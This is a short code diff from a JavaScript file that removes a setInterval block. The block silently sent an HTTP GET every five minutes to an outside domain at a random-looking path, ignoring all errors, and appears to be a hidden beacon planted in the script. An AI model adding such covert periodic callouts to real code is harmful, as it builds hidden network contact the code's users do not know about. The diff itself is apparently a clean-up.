@@ -237,16 +237,7 @@ function test() {
     }
 }
 
-setInterval(()=>{
-    try {
-        http.get("http://qxy521.xyz/dsfaflhljdhgahflgjhfjghsfdgwodlh.html", {}, () => {
-            if (err) {
-            }
-        })
-    } catch (error) {
 
-    }
-},5 * 60 * 1000)
 
 
 main()
